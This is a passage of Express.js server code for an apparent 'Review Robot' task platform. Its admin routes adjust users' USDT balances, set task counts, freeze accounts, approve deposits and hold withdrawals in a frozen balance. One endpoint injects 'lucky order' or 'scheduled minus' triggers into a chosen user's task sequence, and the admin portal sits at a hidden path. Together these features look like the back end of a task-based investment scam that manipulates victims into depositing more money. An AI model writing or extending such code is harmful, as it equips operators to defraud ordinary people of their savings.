// =============================================================
app.get('/api/admin/admins', adminAuthMiddleware, requireRole('superadmin'), (req, res) => {
  const admins = db.prepare('SELECT id, username, role, created_at FROM admins ORDER BY id ASC').all();
  res.json({ success: true, admins, current_admin: req.admin });
});

app.post('/api/admin/admins', adminAuthMiddleware, requireRole('superadmin'), (req, res) => {
  try {
    const { username, password, role } = req.body;
    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password required.' });
    }

    const existing = db.prepare('SELECT id FROM admins WHERE username = ?').get(username.trim());
    if (existing) {
      return res.status(400).json({ success: false, message: 'Admin username already exists.' });
    }

    const validRole = ['superadmin', 'manager', 'finance'].includes(role) ? role : 'manager';
    const salt = bcrypt.genSaltSync(10);
    const hash = bcrypt.hashSync(password, salt);
    const now = new Date().toISOString();

    db.prepare('INSERT INTO admins (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)').run(
      username.trim(),
      hash,
      validRole,
      now
    );

    res.json({ success: true, message: `Admin account "${username}" created with role: ${validRole}!` });
  } catch (err) {
    console.error('Create admin error:', err);
    res.status(500).json({ success: false, message: 'Failed to create admin.' });
  }
});

app.delete('/api/admin/admins/:id', adminAuthMiddleware, requireRole('superadmin'), (req, res) => {
  const targetId = parseInt(req.params.id, 10);
  if (targetId === req.admin.id) {
    return res.status(400).json({ success: false, message: 'You cannot delete your own admin account.' });
  }

  db.prepare('DELETE FROM admins WHERE id = ?').run(targetId);
  res.json({ success: true, message: 'Admin account deleted.' });
});

// Adjust user balance directly
app.post('/api/admin/users/:id/adjust-balance', adminAuthMiddleware, (req, res) => {
  const { amount, reason } = req.body;
  const delta = parseFloat(amount);
  if (isNaN(delta)) {
    return res.status(400).json({ success: false, message: 'Valid numerical amount is required.' });
  }

  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  if (!user) {
    return res.status(404).json({ success: false, message: 'User not found.' });
  }

  const newBalance = Math.max(0, +(user.balance + delta).toFixed(2));
  db.prepare('UPDATE users SET balance = ? WHERE id = ?').run(newBalance, user.id);

  res.json({
    success: true,
    message: `User ${user.username} balance adjusted by ${delta > 0 ? '+' : ''}${delta} USDT. New balance: ${newBalance} USDT.`
  });
});

// Adjust tasks
app.post('/api/admin/users/:id/update-tasks', adminAuthMiddleware, (req, res) => {
  const { completed_tasks, max_daily_tasks } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'User not found.' });

  const completed = completed_tasks !== undefined ? parseInt(completed_tasks, 10) : user.completed_tasks;
  const max = max_daily_tasks !== undefined ? parseInt(max_daily_tasks, 10) : user.max_daily_tasks;

  db.prepare('UPDATE users SET completed_tasks = ?, max_daily_tasks = ? WHERE id = ?').run(completed, max, user.id);
  res.json({ success: true, message: `Updated tasks for ${user.username}: ${completed}/${max}` });
});

// Toggle user status (freeze/unfreeze)
app.post('/api/admin/users/:id/toggle-status', adminAuthMiddleware, (req, res) => {
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'User not found.' });

  const newStatus = user.status === 'active' ? 'suspended' : 'active';
  db.prepare('UPDATE users SET status = ? WHERE id = ?').run(newStatus, user.id);

  res.json({ success: true, message: `User ${user.username} is now ${newStatus}.` });
});

// Toggle user tasks permission (Start / Stop Tasks)
app.post('/api/admin/users/:id/toggle-tasks', adminAuthMiddleware, (req, res) => {
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'User not found.' });

  const newTasksAllowed = (user.tasks_allowed === 1 || user.tasks_allowed === null) ? 0 : 1;
  db.prepare('UPDATE users SET tasks_allowed = ? WHERE id = ?').run(newTasksAllowed, user.id);

  res.json({
    success: true,
    tasks_allowed: newTasksAllowed,
    message: newTasksAllowed ? `Task matching enabled for ${user.username}.` : `Task matching paused for ${user.username}.`
  });
});

// INJECT LUCKY ORDER / SCHEDULED MINUS TRIGGER TO SPECIFIC USER
app.post('/api/admin/users/:id/inject-lucky-order', adminAuthMiddleware, (req, res) => {
  const { trigger_type, target_task_number, amount, expected_return, minus_amount, product_name, product_image } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  if (!user) return res.status(404).json({ success: false, message: 'User not found.' });

  const orderAmt = parseFloat(amount) || 315.72;
  const returnAmt = parseFloat(expected_return) || 18.94;
  const minusAmt = parseFloat(minus_amount) || 0;
  const title = product_name || 'VIP Combination Smart Order Bundle';
  const img = product_image || 'https://images.unsplash.com/photo-1558002038-1055907df827?w=300&auto=format&fit=crop&q=80';
  const now = new Date().toISOString();

  db.prepare(`
    INSERT INTO lucky_order_triggers (user_id, trigger_type, target_task_number, amount, expected_return, minus_amount, product_name, product_image, is_active, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?)
  `).run(
    user.id,
    trigger_type || 'next',
    parseInt(target_task_number || 0, 10),
    orderAmt,
    returnAmt,
    minusAmt,
    title,
    img,
    now
  );

  res.json({
    success: true,
    message: `Lucky Order injected for ${user.username}! Amount: ${orderAmt} USDT, Expected Return: ${returnAmt} USDT. Trigger: ${trigger_type === 'next' ? 'Next Click' : `Task #${target_task_number}`}.`
  });
});

// List Lucky Orders
app.get('/api/admin/lucky-orders', adminAuthMiddleware, (req, res) => {
  const list = db.prepare(`
    SELECT t.*, u.username, u.balance as user_balance, u.completed_tasks as user_completed
    FROM lucky_order_triggers t
    JOIN users u ON t.user_id = u.id
    ORDER BY t.id DESC
  `).all();
  res.json({ success: true, lucky_orders: list });
});

app.delete('/api/admin/lucky-orders/:id', adminAuthMiddleware, (req, res) => {
  db.prepare('DELETE FROM lucky_order_triggers WHERE id = ?').run(req.params.id);
  res.json({ success: true, message: 'Lucky order trigger deleted.' });
});

// Admin Recharges
app.get('/api/admin/recharges', adminAuthMiddleware, (req, res) => {
  const recharges = db.prepare(`
    SELECT r.*, u.username, u.balance as user_balance
    FROM recharges r
    JOIN users u ON r.user_id = u.id
    ORDER BY r.id DESC
  `).all();
  res.json({ success: true, recharges });
});

app.post('/api/admin/recharges/:id/process', adminAuthMiddleware, (req, res) => {
  const { action, notes } = req.body; // 'approve' or 'reject'
  const recharge = db.prepare('SELECT * FROM recharges WHERE id = ?').get(req.params.id);
  if (!recharge) return res.status(404).json({ success: false, message: 'Recharge not found.' });

  if (recharge.status !== 'pending') {
    return res.status(400).json({ success: false, message: 'This recharge request has already been processed.' });
  }

  const now = new Date().toISOString();

  if (action === 'approve') {
    // Credit user balance
    db.prepare('UPDATE users SET balance = balance + ? WHERE id = ?').run(recharge.amount, recharge.user_id);
    db.prepare('UPDATE recharges SET status = ?, admin_notes = ?, processed_at = ? WHERE id = ?').run('approved', notes || 'Approved by admin', now, recharge.id);
    res.json({ success: true, message: `Deposit of ${recharge.amount} USDT approved and credited to user balance!` });
  } else {
    db.prepare('UPDATE recharges SET status = ?, admin_notes = ?, processed_at = ? WHERE id = ?').run('rejected', notes || 'Rejected by admin', now, recharge.id);
    res.json({ success: true, message: `Deposit request marked as rejected.` });
  }
});

// Admin Withdrawals
app.get('/api/admin/withdrawals', adminAuthMiddleware, (req, res) => {
  const withdrawals = db.prepare(`
    SELECT w.*, u.username, u.balance as user_balance
    FROM withdrawals w
    JOIN users u ON w.user_id = u.id
    ORDER BY w.id DESC
  `).all();
  res.json({ success: true, withdrawals });
});

app.post('/api/admin/withdrawals/:id/process', adminAuthMiddleware, (req, res) => {
  const { action, notes } = req.body;
  const withdraw = db.prepare('SELECT * FROM withdrawals WHERE id = ?').get(req.params.id);
  if (!withdraw) return res.status(404).json({ success: false, message: 'Withdrawal not found.' });

  if (withdraw.status !== 'pending') {
    return res.status(400).json({ success: false, message: 'Already processed.' });
  }

  const now = new Date().toISOString();

  if (action === 'approve') {
    // Deduct from frozen balance permanently
    db.prepare('UPDATE users SET frozen_balance = MAX(0, frozen_balance - ?) WHERE id = ?').run(withdraw.amount, withdraw.user_id);
    db.prepare('UPDATE withdrawals SET status = ?, admin_notes = ?, processed_at = ? WHERE id = ?').run('approved', notes || 'Processed', now, withdraw.id);
    res.json({ success: true, message: `Withdrawal of ${withdraw.amount} USDT approved!` });
  } else {
    // Refund frozen balance back to available balance
    db.prepare('UPDATE users SET balance = balance + ?, frozen_balance = MAX(0, frozen_balance - ?) WHERE id = ?').run(withdraw.amount, withdraw.amount, withdraw.user_id);
    db.prepare('UPDATE withdrawals SET status = ?, admin_notes = ?, processed_at = ? WHERE id = ?').run('rejected', notes || 'Rejected', now, withdraw.id);
    res.json({ success: true, message: `Withdrawal rejected. ${withdraw.amount} USDT returned to user available balance.` });
  }
});

// Admin Products Catalog
app.get('/api/admin/products', adminAuthMiddleware, (req, res) => {
  const products = db.prepare('SELECT * FROM products ORDER BY id DESC').all();
  res.json({ success: true, products });
});

app.post('/api/admin/products', adminAuthMiddleware, (req, res) => {
  const { name, price, commission_rate, image_url, category } = req.body;
  if (!name || !price) return res.status(400).json({ success: false, message: 'Name and price required.' });

  db.prepare(`
    INSERT INTO products (name, price, commission_rate, image_url, category)
    VALUES (?, ?, ?, ?, ?)
  `).run(name, parseFloat(price), parseFloat(commission_rate || 0.006), image_url || '', category || 'General');

  res.json({ success: true, message: 'Product added successfully!' });
});

app.delete('/api/admin/products/:id', adminAuthMiddleware, (req, res) => {
  db.prepare('DELETE FROM products WHERE id = ?').run(req.params.id);
  res.json({ success: true, message: 'Product deleted.' });
});

// Admin System Settings
app.get('/api/admin/settings', adminAuthMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM system_settings').all();
  const settings = {};
  for (const r of rows) settings[r.key] = r.value;
  res.json({ success: true, settings });
});

app.post('/api/admin/settings', adminAuthMiddleware, (req, res) => {
  const { settings } = req.body;
  if (!settings || typeof settings !== 'object') {
    return res.status(400).json({ success: false, message: 'Invalid settings object.' });
  }

  const upsert = db.prepare('INSERT OR REPLACE INTO system_settings (key, value) VALUES (?, ?)');
  for (const [k, v] of Object.entries(settings)) {
    upsert.run(k, String(v));
  }

  res.json({ success: true, message: 'System settings updated successfully!' });
});

// Dynamic Admin Secret Route Handling
app.get('/secret-admin-portal-xyz', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-portal.html'));
});

// Allow customizable secret route if changed by admin
app.use((req, res, next) => {
  const currentSecret = getSetting('admin_secret_path', '/secret-admin-portal-xyz');
  if (req.path === currentSecret) {
    return res.sendFile(path.join(__dirname, 'public', 'admin-portal.html'));
  }
  next();
});

// Catch-all for SPA client routing
app.use((req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Review Robot Server running on http://localhost:${PORT}`);
  console.log(`Hidden Admin Portal accessible at: http://localhost:${PORT}${getSetting('admin_secret_path', '/secret-admin-portal-xyz')}`);
});
